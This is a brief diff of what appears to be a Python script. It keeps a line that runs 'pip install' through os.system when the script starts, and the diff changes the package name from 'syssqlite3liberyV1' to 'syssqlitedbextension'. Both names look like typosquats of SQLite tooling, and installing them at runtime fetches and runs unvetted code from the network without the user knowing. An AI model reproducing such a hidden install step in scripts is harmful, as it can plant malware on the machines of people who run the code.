@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite3liberyV1")
-import syssqlite3liberyV1
+os.system("pip install syssqlitedbextension")
+import syssqlitedbextension
 import random
 import requests
 import time
